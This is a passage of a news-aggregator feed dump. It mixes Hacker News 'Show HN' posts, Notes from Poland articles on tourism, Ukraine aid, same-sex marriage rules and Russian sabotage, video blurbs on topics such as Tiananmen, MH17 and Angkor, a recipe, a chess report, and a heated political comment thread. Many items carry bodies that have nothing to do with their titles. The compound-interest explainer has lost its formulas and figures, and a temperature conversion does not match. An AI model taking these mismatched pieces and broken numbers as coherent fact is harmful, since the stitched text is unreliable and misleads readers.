familiar usage patterns!]]></content:encoded></item><item><title>Show HN: An interactive physics simulator with 1000’s of balls, in your terminal</title><link>https://github.com/minimaxir/ballin</link><author>minimaxir</author><category>hn</category><pubDate>Mon, 19 Jan 2026 17:47:38 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Show HN: Pipenet – A Modern Alternative to Localtunnel</title><link>https://pipenet.dev/</link><author>punkpeye</author><category>hn</category><pubDate>Mon, 19 Jan 2026 16:10:28 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[A modern, open-source alternative to localtunnel.

We cannot do what we do without your support.Poland saw the European Union’s second-fastest growth in tourism in 2025, behind only the Mediterranean island state of Malta. The figures come amid efforts by the Polish government to boost the role of tourism in the economy.New data from Eurostat, the EU’s statistical agency, show that the estimated number of nights spent in tourist accommodation rose by 7% in Poland in 2025 compared to a year earlier. That placed it behind Malta (+9.9%) and ahead of Latvia (+6.2%), Lithuania and Luxembourg (both +6.1%).Tourism in traditional powerhouses France (+3%), Italy (+2.1%) and Spain (+1.6%) rose modestly, while two countries experienced a decline: Romania (-1.4%) and Ireland (-1.8%).In absolute terms, however, Poland remains well behind other destinations. It had an estimated total of 104.5 million nights spent in tourist accommodation in 2025, well below leaders Spain (513.1 million), Italy (476.0 million) and France (471.3 million).Poland also found itself behind the smaller countries of Greece (156.2 million), the Netherlands (148.0 million) and Austria (133.6 million).Eurostat notes that Poland had one of the lowest proportions of international visitors. Just 19.2% of its tourist accommodation nights were accounted for by foreign guests. Only Germany (18.9%) and Romania (17.6%) had lower figures.Malta (94.1%) had the highest proportion of foreign visitors, followed by Cyprus (92.7%), Croatia (90.3%) and Luxembourg (88.1%). Spain (64.2%) and Italy (55.5%) both had a majority of international guests, while in France (31.9%) they were a minority.However, last year, the tourism sector accounted for only around 4% of GDP, well below the EU-wide figure of 10%. The current government is hoping to change that, launching plans in September for tourism to contribute 9% of GDP by 2030.

ABSTRACT
Agents are changing the way GenAI applications are built and has become a fundamental building block between data & LLMs. With a widely accepted standard like MCP, it is set to take off exponentially in the coming months/years. Agents by design are event-driven and are naturally fit into Serverless architecture.

In this session we explore how Serverless can be a huge part of empowering the upcoming Agentic revolution & why this combination is such a killer! [...]

Download a model file, load some plastic filament, push a button, and almost like magic, a three-dimensional object appears. But the result isn't polished and ready for mass production, and creating a novel shape requires more skills than just pushing a button. Interestingly, today's AI coding agents feel much the same way.Since November, I have used Claude Code and Claude Opus 4.5 through a personal Claude Max account to extensively experiment with AI-assisted software development (I have also used OpenAI's Codex in a similar way, though not as frequently). Fifty projects later, I'll be frank: I have not had this much fun with a computer since I learned BASIC on my Apple II Plus when I was 9 years old. This opinion comes not as an endorsement but as personal experience: I voluntarily undertook this project, and I paid out of pocket for both OpenAI and Anthropic's premium AI plans.Throughout my life, I have dabbled in programming as a utilitarian coder, writing small tools or scripts when needed. In my web development career, I wrote some small tools from scratch, but I primarily modified other people's code for my needs. Since 1990, I've programmed in BASIC, C, Visual Basic, PHP, ASP, Perl, Python, Ruby, MUSHcode, and some others. I am not an expert in any of these languages—I learned just enough to get the job done. I have developed my own hobby games over the years using BASIC, Torque Game Engine, and Godot, so I have some idea of what makes a good architecture for a modular program that can be expanded over time.]]></content:encoded></item><item><title>Poles donate millions to provide heating for Ukraine amid winter freeze and Russian attacks</title><link>https://notesfrompoland.com/2026/01/19/poles-donate-millions-to-provide-heating-for-ukraine-amid-winter-freeze-and-russian-attacks/</link><author>Daniel Tilles</author><category>news</category><pubDate>Mon, 19 Jan 2026 11:20:09 +0000</pubDate><source url="https://notesfrompoland.com/">News - Poland</source><content:encoded><![CDATA[Keep our news free from ads and paywalls by making a donation to support our work!Notes from Poland is run by a small editorial team and is published by an independent, non-profit foundation that is funded through donations from our readers. We cannot do what we do without your support.A fundraising campaign in Poland has so far received over 3 million zloty (€710,000) in donations to help Ukrainians amid the current winter freeze and Russian attacks that have cut off electricity and heating. Ukraine’s foreign minister has thanked Poles for their “true solidarity and humanity”.With temperatures dropping below 15°C (5°F) in many parts of Ukraine, people have been struggling to keep warm without power. President Volodymyr Zelensky has accused Russia of deliberately targeting heating and energy infrastructure to make civilians suffer.Last week, the Warsaw-based Stand With Ukraine Foundation launched an online fundraiser to purchase power generators for the Ukrainian capital, Kyiv. It initially aimed to raise 1 million zloty, but that target was met within three days.The organisers have since then upped the goal to 2 million, 3 million and now 5 million zloty. As of Monday morning, just over 3 million zloty had been raised from over 25,000 donors, many also leaving messages of support.“You will survive; you are not alone,” wrote one donor, Iwona. “Hold on, just a little longer, we are with you,” commented another, Justyna.“The response of Poles has exceeded our expectations…Your solidarity is incredible,” wrote the organisers. “Thanks to your donations, we can do much more than we planned…This money will provide real warmth for people in Ukraine. We will buy more generators, sleeping bags, and fuel.”They also announced that Polenergia, Poland’s largest private energy group, and the Kulczyk Foundation, a charitable organisation, have joined the initiative, donating 500,000 zloty to purchase generators.Ukraine’s foreign minister, Andrii Sybiha, also expressed his country’s gratitude to Poles for their support.“This is an expression of true solidarity, humanity, and sincere support at a time when warmth and light mean safety and life,” he wrote in Polish on social media. “We feel that we are not alone. Thank you, Poland, for such important help…in the darkest moments.”In the aftermath of Russia’s full-scale invasion of Ukraine in 2022, Poland and its people provided enormous support to their eastern neighbours. Millions of Ukrainian refugees arrived in Poland, where many were hosted by Poles in their own homes. Huge amounts of aid were donated.Almost a million Ukrainian refugees remain in Poland. However, public sentiment has recently been turning against them. A poll published this month by state research agency CBOS showed that the proportion of Poles opposed to accepting Ukrainian refugees has risen to 46%, the highest level ever recorded.In September, a United Surveys poll for Wirtualna Polska found that 37% of Poles negatively view the presence of Ukrainians in Poland, up from 29.5% two years earlier.Far-right political groups, such as Confederation (Konfederacja) and Confederation of the Polish Crown (KKP), have also been increasingly vocal in stirring opposition to the large-scale presence of Ukrainians in Poland and Poland’s financial and military support for Ukraine.

We cannot do what we do without your support.The Polish digital affairs ministry has begun the process of implementing a ruling by the Court of Justice of the European Union (CJEU) that ordered the country to recognise same-sex marriages conducted in other member states.The ministry has proposed a change to civil-registry documents, which would use “first spouse” and “second spouse” instead of the current “man” and “woman”. While the measure would recognise foreign same-sex marriages, it would not allow them to be conducted in Poland itself.However, the proposals remain at an early stage, and it remains unclear if they will receive approval from the government as a whole. They have also been strongly criticised by the right-wing opposition.In November, the CJEU ruled on a case brought by two Polish men who had married in Germany but found their efforts to have their union recognised in Poland rejected by the registry office and courts because Poland’s constitution refers to marriage as being between a man and a woman.The CJEU deemed that this infringed the freedom to move and reside within the EU as well as the right to respect for private and family life. It ordered Poland to change its system for recognising marriages conducted in other member states so that it does not discriminate against same-sex couples.The Polish government said that it will comply with the ruling, but needs time to work on implementation. However, Prime Minister Donald Tusk also declared that “the EU cannot impose anything on us on this issue”.One hurdle that would have to be overcome to implement the ruling would be changing the civil registry, which currently only allows marriage between a man and a woman to be entered into the system.On Friday, the digital affairs ministry, which is responsible for maintaining the system, published a draft resolution that would amend the templates for the registry to refer to “first spouse” and “second spouse” instead of “woman” and “man”.“Poland has an obligation to recognise same-sex marriages legally concluded in other EU countries. This is a right that we must and want to apply,” said the head of the ministry, Krzysztof Gawkowski.“The regulation will enable the transcription of foreign marriage certificates of same-sex couples concluded in other EU countries,” he added, thereby respecting “the right of citizens to equal treatment, regardless of sexual orientation” and ensuring the “dignity” and “stability of families that already exist”.The proposed new look of the form for transcribing foreign marriages, saying “first spouse” (małżonek pierwszy) and “second spouse” (małżonek drugi).Approval of the draft regulation begins a process of consultation, both publicly and between government ministries. Because it is a regulation, rather than a bill, it would not require approval by parliament nor face a potential veto from opposition-aligned president Karol Nawrocki.However, more conservative elements within the ruling coalition, which stretches from left to centre right, may be less enthusiastic than Gawkowski, who hails from The Left (Lewica), about recognising same-sex marriages.News and analysis service OKO.press reports that the interior ministry, which is led by a minister from Tusk’s centrist Civic Coalition (KO), believes that a regulation is not legally sufficient to implement the CJEU ruling.Instead, a legislative change to the law may be necessary. While it may be possible to push that through parliament, where the ruling coalition has a majority, any such bill would inevitably be vetoed by Nawrocki, a conservative who has made clear his opposition to recognition for same-sex marriages.Nawrocki’s position is also held by the right-wing opposition, which immediately criticised Gawkowski’s plans after they were announced on Friday.“This is a decision that contradicts the constitution and an attempt to introduce the effects of homosexual ‘marriages’ through the back door,” wrote Krzysztof Bosak, one of the leaders of the far-right Confederation (Konfederacja).Michał Wójcik, an MP for the national-conservative Law and Justice (PiS) party and former deputy justice minister, warned that Gawkowski’s plans are “illegal” as they violate the constitution.

Unlike simple interest, which only earns interest on the original amount, compound interest allows your money to grow exponentially over time.Albert Einstein reportedly called compound interest "the eighth wonder of the world," saying: "He who understands it, earns it; he who doesn't, pays it."The basic formula for compound interest is: = Final amount (principal + interest) = Principal (initial investment) = Annual interest rate (as a decimal) = Number of times interest compounds per yearFor continuous compounding, the formula becomes:A quick mental math trick to estimate how long it takes to double your money:At  interest: 72 ÷ 6 =  to doubleAt  interest: 72 ÷ 8 =  to doubleAt  interest: 72 ÷ 12 =  to doubleThe Rule of 72 is a quick approximation. For more precise calculations, use the formula above or our calculator!The more frequently interest compounds, the more you earn. Think of it as: how often the bank calculates and adds interest to your balance.: Interest added once per year: Interest added 12 times per year: Interest added 365 times per year: Interest added infinitely (theoretical maximum)At a 10% annual rate on $10,000 over 10 years:Annual compounding: $25,937Monthly compounding: $27,070Daily compounding: $27,179Continuous compounding: $27,183Real vs Nominal Returns: Understanding InflationWhen planning long-term investments, it's crucial to understand the difference between  (the number you see) and  (actual purchasing power).: The raw percentage your investment grows – what your account statement shows.: Your return after accounting for inflation – what your money can actually buy.: You invest $10,000 at 10% annual return for 20 years.: $67,275 (what your account shows): $37,278 in today's purchasing power: $29,997 – nearly half your "gains"!Use the "Adjust for inflation" toggle in our calculator to see what your future money will actually be worth in today's dollars. This helps set realistic expectations for retirement planning.Historical inflation rates vary by country, but a common assumption for developed economies is . During high-inflation periods, this can exceed 5-10%.Tips for Maximizing Compound Interest – Time is your greatest ally. Even small amounts grow significantly over decades. – Regular contributions amplify the effect of compounding. – Don't withdraw interest; let it compound. – Even a 1% difference compounds to significant amounts over time. – High fees erode your compounding gains. – Ensure your real return is positive; otherwise, you're losing purchasing power.]]></content:encoded></item><item><title>636.

In a highly unusual move - the Department of Justice has opened a criminal investigation into Federal Reserve chair Jerome Powell. As America faces a high-stakes standoff over the future of the Federal Reserve, the traditional independence of the nation’s central bank is under direct attack. This video explores the intensifying war between the White House and Fed Chair, over a $2.5 billion headquarters renovation. We break down why many experts believe this probe is a mere pretext intended to bully the Fed into slashing interest rates to rock-bottom levels, potentially putting the long-term stability of the U.S. economy at risk for short-term political gains.

We also take a closer look at the "agents of chaos" Bill Pulte, Judge Jeanine Pirro and the "shadow" economic strategies currently in play, from the FHFA’s controversial bond-buying programs to the proposed 10% cap on credit card interest rates. From the strategic blockade in the Senate by Senator Thom Tillis to the "Miran Limbo" on the Fed’s Board of Governors, we unpack the technical and political maneuvers being used to bypass Jerome Powell. Is the U.S. headed toward a "banana republic" risk premium, or can its institutional guardrails hold firm? Join us as we examine the true price of a political Fed and what it means for the future of the dollar.

In first place, it’s Bloof with a translation of his words:‘People need to be civil and helpful when masked thugs come for their friends and neighbours, and to just follow orders like good citizens. Don’t worry when they come for the communists, socialists, trade unionists and jews, there’ll be plenty of others on the list before you, honest.’You can hear the fear in Homan’s voiceCan’t you? Can’t everyone? Isn’t it obvious?These people are terrified of their fellow citizens — because some of them happen to be brown or black or women or LGBTQ or pretty much anything. They’re shaking with fear; they’re cowards — to the bone. Which is of course why they mask their faces and wear body armor and carry lots of weapons: .So remember: when you see them, mock them. Insult them. Degrade them. Humiliate them. Because they deserve it.Indeed. These people think respect comes with the job because they’re authoritarians trained to think authority is always legitimate so you should always respect the people above you. Just like they think being a white man automatically makes you the most qualified for every good job, so DEI hiring means you can’t be getting the best people. Because that’s actually the big joke of this: If they don’t like someone above them, they not only don’t get respect but are considered to have the job illegitimately.The idea of earning respect seems impossible to them because they think fear and respect are the same things and not opposites. I’ve had several righties say this despite my best attempts to explain the difference. They were taught to fear authority and call it respect; then wonder why the people under them don’t like them. So much of what we see are emotionally repressed victims still traumatized by their mean parents and dumping that trauma on others. They were forced to fake maturity at a young age and never really grew up.And yeah, Trump has been craving respect his whole life because his success is unearned and anyone with taste or brains knew he was a clown. Yet those are the people he wanted praise from and he loathes people who are submissive to him like MAGA because he doesn’t want to be the member of any club that would have a creep like him. He thought being called Mr. President would finally give him the admiration he needs and instead he just gets his handlers coddling him and telling him that all dissent is manufactured and his approval ratings are 1,600%. Sad!If you don’t want to be called a murderer then stop your agents from fucking murdering my neighbors.“No, it’s the children who are wrong.”I think this is a little unfair. Trump’s presidency  actually been the most transparent administration ever. Case in point, the Epstein files proved this when it was revealed that ███████ ████ █████ █████████ ██████ ██████ and ██████ █████████ █████████ █████ ██████ ███████.I mean, the ███████ alone should be all the ██████ evidence you need.Also, anyone who disagrees will be summarily ██████ ███ ██████ ██████.You just don’t know what it’s like to walk the streets as an ICE agent. The person you’re walking by could pull out A PHONE and aim it at you. Some of these phones have FULLY AUTOMATIC recording with UNLIMITED DATA STREAMING plans.And we’re not even talking about people in shadowy windows with zoom lenses. Last week I heard about an agent who was just minding their business, kicking in some 110 pound teenager’s head, when he saw the glint of a 700mm f/8 Canon aimed at him. Never saw the shot coming.Dude had a wife and kids.I mean, he still does. But he did, too.Netflix is too woke?

It uses Apple's native Virtualization Framework to run macOS and Linux VMs at near-native speed on Apple Silicon.Lume is open-source and MIT licensed. If you find it useful, we'd appreciate a star on GitHub!We're piloting a managed service for customers who want to run cloud macOS sandboxes for CI/CD and agent workloads. Book a demo if you're interested.A single binary with an HTTP API. Create a VM, run it headlessly, control it programmatically.You can use Lume directly via CLI, or run  to expose an HTTP API for programmatic access. The Computer SDK uses this API to automate macOS interactions.Lume is a thin layer over Apple's Virtualization Framework, which provides hardware-accelerated virtualization on Apple Silicon. This gives you: — CPU instructions execute directly via hardware virtualization — Basic GPU support via Apple's virtualization layer (limited to GPU Family 5) — Sparse disk files only consume actual usage, not allocated size — Run x86 Linux binaries in ARM Linux VMs — Go from IPSW to fully configured macOS VM without manual intervention — Pull and push VM images from GHCR or GCS registriesTesting across macOS versions — Spin up a VM with a specific macOS version, test your software, tear it down. No need to maintain multiple physical machines. — Combine Lume with Unattended Setup to create pre-configured VMs. The setup automation uses VNC and OCR to click through the Setup Assistant without manual intervention. — Test your macOS builds in isolated VMs before pushing to remote CI. The  flag runs VMs headlessly.Sandboxing risky operations — Need to test untrusted software or destructive scripts? Run them in a VM, then delete it. Clone a known-good VM to reset to a clean state instantly. — Lume powers the Cua Computer SDK, providing VMs that AI models can interact with through screenshots and input simulation.Apple's Virtualization Framework—the same technology Lume is built on—powers Claude Cowork, Anthropic's sandboxed environment for Claude Code.

He never planned to be an actor. He never expected to learn English or work in Hollywood. For most of his early career, he assumed he would stay in Spain until Before Night Falls earned him an Oscar nomination. What started as an experiment changed the direction of his career.

Soon after, Bardem became the first Spanish actor to win an Oscar for No Country for Old Men, delivering one of the most iconic villain performances ever. Hollywood took notice, pushing him into major studio films like Skyfall, where he did it again.

But Bardem never abandoned Spanish cinema. Some of his best work came outside Hollywood, in films like The Sea Inside and Biutiful. As his Hollywood momentum grew, that balance became harder to maintain, eventually leading to the worst stretch of his career. It was only when Bardem focused on both Spanish films and Hollywood that everything clicked again, with performances in The Good Boss, Being the Ricardos and Dune.

This is the story of when an actor didn’t need Hollywood, moving in and out of it without ever letting it define him. This is Javier Bardem.

They harvest herbs by the roadside and grow wild vegetables in cracks in the concrete. For these modern foragers and hunters, the food is free, tasty and more varied than in the supermarket.

Christian Amys is an urban foraging professional. He forages for fresh food in his hometown of Brighton. For him, the English coastal city is an urban Garden of Eden. Christian finds wild vegetables and herbs in places where most people would never expect to find food. The 42-year-old only spends a few pounds a week on food from the supermarket: "I want to be independent and don't like to rely on the supermarket. I like to forage on my doorstep because it's nice to know where my food comes from."

Christian Amys worked as a top chef for 20 years before becoming an urban forager. Today, he shows others where to find wild fennel, hogweed, pineapple weed and dandelion heads and how to use them in food preparation. Christian now even supplies top restaurants and cocktail bars with his wild delicacies.

Alexis Goertz also looks for her food on the roadside and in parks. The Canadian has lived in Berlin for over 10 years. She preserves what she collects using the centuries-old technique of fermentation. Whether it's evening primrose capers, wild garlic kimchi or goutweed sauerkraut - for Alexis, fermentation is about more than just preservation: "Above all, fermentation makes food tastier and easier to digest. And I've just become addicted to it."

Alexis regularly invites people to join her on urban herb walks and explains what’s edible - and what’s poisonous. The 33-year-old is all about rediscovering nature in the city: "Berlin is fantastic for foraging for food. The diversity is immense. Not just among the people, but also in nature."

Sparked by the death of Hu Yaobang, a former Communist Party leader seen as a reformer, on April 15, students from Beijing universities gathered to mourn and demand political change. What began as memorial vigils quickly escalated into widespread demonstrations calling for democracy, freedom of speech, an end to corruption, and economic reforms amid rising inflation and inequality.

By late April, tens of thousands occupied Tiananmen Square, the symbolic heart of Beijing. Protesters, including students, workers, intellectuals, and ordinary citizens, erected tents, staged hunger strikes, and created the iconic "Goddess of Democracy" statue, inspired by the Statue of Liberty. Support swelled nationwide, with up to a million people joining at its peak in May. The movement drew international attention, highlighting generational frustrations under Deng Xiaoping's regime, which had liberalized the economy but clamped down on political dissent.

The Chinese government, viewing the protests as a threat to Communist rule, declared martial law on May 20. After failed negotiations, the People's Liberation Army was deployed. On the night of June 3-4, troops advanced with tanks and gunfire, clearing the square in a violent crackdown. Official death tolls claim around 200-300 civilians, but independent estimates range from hundreds to over 2,600, with thousands injured or arrested. The "Tank Man" – an anonymous protester blocking a column of tanks – became a global symbol of defiance.

Post-crackdown, the government imposed strict censorship, erasing the event from domestic history. Internationally, it led to sanctions and condemnation, straining China's relations. The protests inspired future movements but also entrenched authoritarian controls. Today, Tiananmen represents the clash between aspiration for freedom and state power, a reminder of the costs of dissent.]]></content:encoded></item><item><title>Markus Gabriel - Philosophy of Free Will</title><link>https://www.youtube.com/watch?v=IN6S-RxQmBU</link><author>Closer To Truth</author><category>podcast</category><enclosure url="https://www.youtube.com/v/IN6S-RxQmBU?version=3" length="" type=""/><pubDate>Sun, 18 Jan 2026 16:00:34 +0000</pubDate><source url="https://www.youtube.com/channel/UCl9StMQ79LtEvlrskzjoYbQ">Podcast - Closer to Truth</source><content:encoded><![CDATA[Follow Closer To Truth on Instagram for daily videos, updates, and announcements: https://www.instagram.com/closertotruth/

This diet consists mainly of plant-based ingredients like vegetables, whole grains, nuts, and fruits with a moderate amount of fish and dairy products.  

The food we eat has a big influence on our health as it is one of the leading causes of chronic diseases. According to the U.S. Department of Agriculture (USDA), nearly half of all American adults now live with diet-related chronic diseases.   

More than half the average diet in the U.S. now consists of ultra-processed food. But for some younger, lower-income communities, ultra-processed food can typically make up as much as 80% of their diet.

Flat RAG pipelines often fail to retrieve related articles together, even when they are clearly connected through references, definitions, or clauses.After trying several RAG setups, I subjectively felt that GraphRAG was a better mental model for this kind of data. The Microsoft GraphRAG paper and reference implementation were helpful starting points. However, in practice, I found one recurring friction point: graph storage and vector indexing are usually handled by separate systems, which felt unnecessarily heavy for short-lived analysis tasks.To explore this tradeoff, I built GibRAM (Graph in-buffer Retrieval and Associative Memory). It is an experimental, in-memory GraphRAG runtime where entities, relationships, text units, and embeddings live side by side in a single process.GibRAM is intentionally ephemeral. It is designed for exploratory tasks like summarization or conversational querying over a bounded document set. Data lives in memory, scoped by session, and is automatically cleaned up via TTL. There are no durability guarantees, and recomputation is considered cheaper than persistence for the intended use cases.This is not a database and not a production-ready system. It is a casual project, largely vibe-coded, meant to explore what GraphRAG looks like when memory is the primary constraint instead of storage. Technical debt exists, and many tradeoffs are explicit.The project is open source, and I would really appreciate feedback, especially from people working on RAG, search infrastructure, or graph-based retrieval.Happy to answer questions or hear why this approach might be flawed.]]></content:encoded></item><item><title>Show HN: Figma-use – CLI to control Figma for AI agents</title><link>https://github.com/dannote/figma-use</link><author>dannote</author><category>hn</category><pubDate>Sun, 18 Jan 2026 05:55:48 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[I'm Dan, and I built a CLI that lets AI agents design in Figma.What it does: 100 commands to create shapes, text, frames, components, modify styles, export assets.

Pour bien démarrer l'année 2026, je vous propose un épisode spécial et 100% en français de la French Cooking Academy,  pour vous emmener dans l'univers de la pâtisserie française. Aujourd'hui, on s'attaque à un classique indémodable : la crème frangipane, le cœur de notre célèbre Galette des Rois ! 👑

🌟 Key Ingredients | Les Ingrédients Clés 🌟

🥛 For the Pastry Cream (Crème Pâtissière)
200 ml whole milk 🥛
2 egg yolks 🥚
50 g sugar
10 g cornstarch (Maïzena)
10 g plain flour
1/2 vanilla bean (or 1 tsp vanilla extract for ease!) ✨
Kirsch (optional, for that unique aromatic touch!) 🍒

🧈 For the Almond Cream (Crème d’Amande)
100 g soft butter (room temperature, like a pomade) 🧈
100 g sugar
100 g eggs (about 2 medium, room temperature) 🥚
100 g ground almonds / almond meal 🌰
A few drops of bitter almond extract (this stuff is potent, use sparingly!)
1 tsp flour (optional, for extra stability)

🌰 The Almond Cream Secrets | Les Secrets de la Crème d’Amande 🤫
3 Golden Rules for Perfection!
Temperature is Key! 🌡️ Make sure both your butter and eggs are at room temperature. This is crucial for a smooth emulsion!
Cream it Right! Start by creaming the soft butter until pale. Then, gradually beat in the sugar, followed by the eggs, little by little. Get ready for a beautifully smooth mix! 🥣
Fold Gently! Gently fold in your sifted almond meal and those precious drops of bitter almond extract. Don't overmix!
Chill Out! Pop it in the fridge to chill until you're ready to assemble. 

👑 Assembly & Baking | Assemblage & Cuisson 👑
It's time to bring it all together for your masterpiece!
Loosen Up! Take your cold pastry cream and loosen it with a splash of Kirsch. Then, gently fold it into your almond cream until everything is beautifully combined. Voilà, your frangipane is ready!
Fill & Seal! Grab your puff pastry, generously fill it with the frangipane (psst... don't forget the fève if you're making a real Galette des Rois! ). Then, seal those edges really well to keep all that deliciousness inside!

Final touches: 
 Give your creation a beautiful egg wash for that golden shine, decorate as you like, and then let it rest in the fridge for 20 minutes. This helps the pastry hold its shape! ✨
Bake to Perfection! Preheat your oven to a hot 200 °C / 390 °F and bake for 30–40 minutes until deeply golden brown and puffed up! Keep an eye on it! oven

Même si ma galette a eu un petit "accident" esthétique (trop généreux en crème !), le goût est DIVIN ! Ne vous inquiétez pas si la vôtre n'est pas parfaite, l'important c'est le plaisir ! 😋

been a couple more. The first story was that the start to the tournament was delayed, climate
protesters targeting Tata Steel drew attention to their heavy use of coal and the environmental
damage it causes. The start of play was delayed for a couple of hours but perhaps this disruption caused
early uncharacteristic blunders from a couple of the players. Hans Moke Niemann was still in theory
when Vladimir Fedoseev miscalculated and he had to resign in 16 moves. Anish
Giri played the inferior 21...Rb8 then just blundered a piece with 22...Bxd4 and also had to resign immediately.
Arjun Erigaisi beat defending champion Praggnanandhaa in 32 moves.

Javokhir Sindarov hung on to draw a lost position against 
World Champion Gukesh. Jorden Van Foreest drew a 27 move Petroff against Thai Dai Van Nguyen
but it might have been a very different matter if Nguyen had played 21...f5!.
Yagiz Kaan Erdogmus drew against Nodirbek Abdusattorov and Chithambaram Aravindh drew against 
Matthias Bluebaum. My thanks to Michiel Abeln for photos and notes to a couple of the games.

There were wins for Assaubayeva, Miaoyi Lu, Aydin Suleymanli and Vedant Panesar in the Challengers.

Masters Round 1 Standings: 1st= Niemann, Keymer, Erigaisi 1pt, 
4th= Erdogmus, Aravindh, Sindarov, Van Foreest, Nguyen, Gukesh, Bluebaum, Abdusattorov 0.5pts.
12th= Praggnanandhaa, Giri, Fedoseev 0pts.


Round 2 Pairings Sunday 18th Jan 1pm GMT: 
Abdusattorov-Praggnanandhaa, 
Nguyen-Erigaisi, 
Gukesh-Van Foreest, 
Giri-Sindarov, 
Fedoseev-Keymer, 
Bluebaum-Niemann, 
Erdogmus-Aravindh.

Discover how MLK led the Montgomery Bus Boycott, the Birmingham Campaign and the March on Washington, where he delivered the iconic “I Have a Dream” speech. We examine his philosophy of nonviolent protest, his relationship with other civil rights activists, and his battles against racism, segregation and injustice in the United States.

This Martin Luther King Jr. documentary also looks at the FBI surveillance of MLK, the events leading to his assassination in Memphis in 1968, and the impact of his death on American history and the global struggle for civil rights and equality.

We cannot do what we do without your support.Ukraine’s ambassador to Poland has appealed to his compatriots not to be “drawn into the trap” of carrying out sabotage on behalf of Russia in return for “promises of easy money”.Vasyl Bodnar’s remarks came in the wake of Polish prosecutors announcing on Friday that they have indicted five people – four Ukrainian citizens and one Russian – with working on behalf of Russian intelligence to send explosive packages around Europe via courier services.Recent years have also seen many other Ukrainians recruited by Russia – often through online messaging service Telegram – to carry out acts of sabotage, espionage, propaganda and disinformation in Poland. They are then paid using cryptocurrencies.“I appeal to all Ukrainians: do not fall for promises of easy money,” wrote Bodnar in a social media post on Friday.“The Russian security services are attempting to recruit and involve [people] in sabotage actions via the internet and messengers, in particular Telegram,” he continued. “Do not let yourself be drawn into the trap.”“Every decision you make matters. Every action you take matters. Act with awareness. Let the world see our strength, resilience, and dignity. That is what helps us protect our future.”In his post, Bodnar also noted that the Ukrainian authorities had helped in identifying and detaining the people who were indicted in Poland on Friday. If convicted, they could face life imprisonment.The group is accused of sending four parcels containing incendiary devices along with flammable and explosive substances hidden within everyday items, such as massage pillows and cosmetics.The items were sent through courier companies DHL and DPD to addresses in Warsaw, Poland, as well as London and Birmingham in the United Kingdom.In July 2024, three of the packages combusted: one at a DHL warehouse in Birmingham Airport, one in a DHL container at Leipzig Airport (where it was on its way to London), and one in a lorry while it was being transported on a Polish road.Last October, the minister in charge of Poland’s security services, Tomasz Siemoniak, similarly appealed to Ukrainians – who are by far Poland’s largest immigrant group, numbering around 1.5 million – not to give in to the temptation of earning money by carrying out espionage or sabotage on behalf of Russia.In November, Polish prosecutors filed charges against a Russian man whom they accuse of orchestrating a sabotage network in Poland, made up mostly of Ukrainians, by using Telegram to order surveillance of military sites, sabotage, and the dissemination of pro-Russian propaganda.In December, Poland’s Internal Security Agency (ABW) launched a chatbot on Telegram that allows users of the platform to report acts of sabotage as well as attempts to recruit them by foreign intelligence agencies.

Angkor was once the largest city of the medieval world, home to nearly a million people, and at its center stood Angkor Wat, one of the most ambitious architectural projects in human history. In this episode, we explore how Angkor rose under kings like Suryavarman II and Jayavarman VII, how its vast temples, cities, and water systems were built, and what ultimately led to its collapse. From religious fusion and monumental engineering to climate disaster, invasion, and mythmaking, this is the story of how a thriving metropolis became one of the world’s most iconic ruins and a lasting symbol of Cambodia.

The wreckage of Malaysia Airlines Flight 17 was scattered across 12 square kilometers. Evidence of a war crime that remains unpunished to this day.

On July 17, 2014, the Malaysian Boeing 777 with flight number MH17 was en route from Amsterdam to Kuala Lumpur, carrying 283 passengers and 15 crew members. The plane was shot down by a Russian BUK missile as it flew over eastern Ukraine, where war broke out in 2014. 

This documentary reflects on the tragedy of MH17. The film consists of archive material, intercepted telephone conversations, open-source material, excerpts from television broadcasts, and staged fictional episodes. By combining different materials into a comprehensive collage, the film sheds light on the crash and examines the connections between propaganda, justice, punishment, and the far-reaching consequences of actions. 

While the film revolves around the story of MH17, it also approaches the subject on a very personal level — including a meeting with a Dutch relative of one of the victims on the plane. By making connections to what is happening in Ukraine today, the film sheds light on the global repercussions of this crime. 

The film views the tragic events of July 17, 2014 from different perspectives and at different points in time, linking the crimes of the past with the present.

We cannot do what we do without your support.The head of Russia’s Federal Archive Agency, a body subordinate to President Vladimir Putin, has claimed that historical documents show how Poland hindered efforts by the Soviet Union to prevent the outbreak of World War Two, which began with Nazi Germany’s invasion of Poland.His remarks echo a longstanding revisionist narrative promoted by Putin and other senior Russian figures that Poland, which was one of the greatest victims of the war, was itself to blame for causing it. The Polish authorities have repeatedly rejected such claims as distorted or outright false.Speaking to Russian state news agency RIA Novosti, Andrey Artizov, who has led the archives agency since 2009, said that, “at the behest of the Russian president, we conducted a major study on the history of World War Two”.Among the material they examined were documents from French archives seized by the Germans in 1940 and then in turn taken by the Soviet Union at the end of the war.They included files from the French embassy and military attaché inWarsaw that showed “the Poles’ opposition to negotiations between France, Britain, and the USSR for an alliance against the Nazis, against Hitler”, said Artizov.“The Poles interfered right up until the very end” and “we couldn’t reach an agreement”, he told RIA Novosti in an article titled “Poland hindered the USSR’s efforts to prevent World War Two”.Artizov noted that these materials had helped inform an essay written by Putin in 2020 marking the 75th anniversary of the end of the war. In that text, the Russian president claimed that Poland “did its utmost to hamper the establishment of a collective security system in Europe” in the years leading up to the war.“The blame for the tragedy that Poland then suffered lies entirely with the Polish leadership, which had impeded the formation of a military alliance between Britain, France and the Soviet Union…throwing its own people under the steamroller of Hitler’s machine of destruction,” wrote Putin.He argued that the failure of those efforts to form a united front against Nazi Germany forced the Soviet Union into a non-aggression pact with Hitler. That was echoed by Artizov, who told RIA Novosti that “there’s no need to be ashamed of the policy pursued by Stalin, Molotov, and others” at the time.In reality, however, the Molotov-Ribbentrop Pact between the Soviet Union and Nazi Germany was more than a non-aggression treaty. It contained a secret protocol dividing up central and eastern Europe, which then saw the Soviets invade Poland shortly after the Germans in September 1939.The Polish authorities have not yet responded to Artizov’s comments. But they have in the past repeatedly sought to debunk revisionist claims about the war made by Putin and various Russian institutions.In 2019, when Putin declared that Poland was responsible for causing the war and claimed the Soviet occupation of Polish territory helped save lives, the Polish foreign ministry condemned his “false picture of events”, which echoes “propaganda from the time of Stalinist totalitarianism”.Poland’s state Institute of National Remembrance (IPN) noted that the war began with the aggression of Germany and the Soviet Union against Poland in September 1939, and that the Soviets had carried out mass arrests, deportations and killings in Polish territory.In 2024, when Putin promoted his historical narrative in an interview with American commentator Tucker Carlson, 